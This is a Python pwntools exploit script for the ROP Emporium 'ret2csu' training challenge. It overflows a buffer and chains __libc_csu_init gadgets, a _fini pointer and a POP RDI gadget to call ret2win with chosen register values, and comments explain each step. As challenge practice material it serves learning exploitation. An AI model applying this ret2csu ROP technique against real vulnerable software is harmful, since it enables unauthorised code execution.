# reference: https://meowmeowxw.gitlab.io/wargame/rop-emporium/7-ret2csu/
#!/usr/bin/env python3

from pwn import *

class Sender:
    def __init__(self, local, debug):
        if debug == True:
            context.log_level = True
        if local == 'local':
            self.conn = process('./ret2csu')
        else:
            self.conn = remote('127.0.0.1', 9999)

def generate_payload():
    POP_RDI_RET = 0x4006a3
    POP_RSI_POP_R15_RET = 0x4006a1
    RET2WIN_PLT = 0x400510
    GADGET_2 = 0x400680   #MOV RDX R15, MOV RSI R14, MOV EDI R13d, CALL QWORD PTR R12+RBX*8
    GADGET_1 = 0x40069a   #POP RBX, POP RBP, POP R12, POP R13, POP R14, POP R15, RET
    RET2WIN_GOT_PLT = 0x601020   #GOT..PLT address of ret2win, at this address is the PLT address ret2win which when called will call ret2win from libret2csu.so library
    SYM_FINI_OPCODE_ADDR = 0x600e48
    payload = b'A' * 40
    payload += p64(GADGET_1)
    payload += p64(0x0)        # value into RBX (0 so that in Gadget 2 in last CALL we don't affect QWORD PTR value in R12, with unnecessary RBX value multipled by 8 and added to it)
    payload += p64(0x1)     # value into RBP
    # at address 0x600e48 (SYM_FINI_OPCODE_ADDR variable) there is operation code 0x4006b4 which happens to be an address of the first instruction of _fini function, and that function only changes value of RSP and then returns, meaning that it will not mess up values in other registers, so we can use it to serve as a 'bridge' between execution of Gadget 2 and POP_RDI_RET gadget, allowing us to fix the value of RDI which was modified by Gadget 2 in a way that prevents solving the problem. If we load RDI with 0xdeadbeefdeadbeef, RDI will have the right value for ret2win
    payload += p64(SYM_FINI_OPCODE_ADDR)      # value into R12 (address at which _fini function address is located)
    payload += p64(0xdeadbeef)       # value into R13d (32 bits for EDI after Gadget 2)
    payload += p64(0xcafebabecafebabe)     # value into R14, will be placed in RSI
    payload += p64(0xd00df00dd00df00d)     # value into R15, will be placed in RDX
    payload += p64(GADGET_2)
    # we must push 7 64-bit values (0x0 as junk hexadecimal values) on the stack: 1 junk 0x0 value to balance the RSP since at address 0x00400696 in Gadget 1 code section there is 'add rsp, 8' instruction (which will move stack pointer by 8 bytes up, opposite of normal stack movement in negative direction when values are pushed on it), and 6 junk values for the 6 POP instructions in Gadget 1 (these 7 Gadget 1 instructions follow after Gadget 2 call above)
    payload += p64(0x0) * 7
    # now we load RDI with the correct value required by ret2win
    payload += p64(POP_RDI_RET)
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(RET2WIN_PLT)
    payload += p64(0x0)       # return address for ret2win final RET
    with open("./out.txt", "wb") as out:
        out.write(payload)
    return payload

def main():
    payload = generate_payload()
    sender = Sender("local", False)
    sender.conn.recvuntil(">")
    sender.conn.sendline(payload)
    log.info(sender.conn.recvline())
    sender.conn.interactive()
    sender.conn.close()

if __name__ == "__main__":
    main()


